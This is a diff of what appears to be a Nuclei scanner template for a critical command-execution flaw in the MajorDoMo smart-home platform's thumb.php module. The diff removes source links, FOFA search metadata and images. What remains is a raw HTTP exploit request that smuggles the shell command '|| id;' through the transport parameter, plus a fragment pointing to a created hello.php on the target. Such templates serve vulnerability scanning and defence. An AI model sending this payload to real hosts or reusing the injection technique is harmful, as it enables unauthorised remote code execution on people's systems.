@@ -3,12 +3,8 @@ info:
   name: 智能家居平台MajorDoMo thumb存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fvwhqw79d7gxfsx1'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fvwhqw79d7gxfsx1
-    fofa: title="MajordomoSL"
 http:
 - raw:
   - 'GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+id%3B HTTP/1.1
@@ -23,10 +19,7 @@ http:
 
     Cache-Control: max-age=0
 
-    Upgrade-Insecure-Requests: 1
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711659892-1adb00a9-3d45-4d9c-8b3f-fcc57e232e2b.png)'
+    Upgrade-Insecure-Requests: 1'
   redirects: false
   matchers:
   - status:
@@ -50,13 +43,9 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711660105-0006211e-bc19-4e7c-ad68-1225bb57c227.png)
-
     访问
 
-    Ip/hello.php
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711660325-e12ee727-04ac-4722-a090-f07f77a7db85.png)'
+    Ip/hello.php'
   redirects: false
   matchers:
   - status:
